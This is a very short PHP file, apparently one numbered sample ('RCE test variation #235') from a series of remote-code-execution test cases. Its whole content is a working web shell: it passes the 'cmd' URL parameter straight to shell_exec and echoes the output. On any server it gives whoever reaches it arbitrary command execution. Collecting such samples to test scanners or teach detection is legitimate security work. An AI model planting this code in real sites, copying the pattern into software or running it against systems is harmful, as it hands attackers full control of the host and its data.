<?php
// RCE test variation #235
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>